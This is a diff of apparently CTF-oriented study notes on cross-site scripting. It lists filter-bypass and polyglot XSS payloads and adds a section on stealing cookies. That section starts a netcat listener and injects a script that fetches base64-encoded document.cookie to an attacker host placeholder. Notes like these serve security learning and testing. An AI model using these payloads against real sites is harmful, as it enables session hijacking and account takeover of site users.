@@ -42,3 +42,8 @@ You can use "XSS hunter express" to find blind xss vulnerability.
 5. Here is the situation where the webiste filters out the `script` word from the actual script, you can use the payload `<sscriptcript>alert('THM');</sscriptcript>`
 6. When the website request for images, you can either use `<img src=x inload=alert('HTB');>` OR `<Existing_File_Path>/test.jpg"onload="alert('Hacked');`
 7. Use Polygot Pyaload to escape attributes, tags and all filter all in one ``` jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e ```
+
+## Extracting Cookie from website using XSS
+1. Find the input field where the xss is reflected
+2. run the `nc -lvnp <port_number>` on attacker machine.
+3. run and click on the script on website `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>` (replace URL_OR_IP with your attacker informations)
